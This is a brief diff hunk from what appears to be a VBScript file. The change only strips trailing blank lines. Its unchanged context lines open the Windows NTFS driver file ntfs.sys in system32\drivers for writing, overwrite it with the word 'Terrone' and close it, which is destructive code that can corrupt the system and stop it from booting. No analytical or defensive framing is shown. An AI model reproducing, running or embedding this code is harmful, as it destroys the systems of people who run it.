@@ -7,7 +7,3 @@ Set objFile = objFSO.OpenTextFile(windir & "\system32\drivers\ntfs.sys", ForWrit
 objFile.WriteLine "Terrone"
 objFile.Close
 end if
-
-
-
-
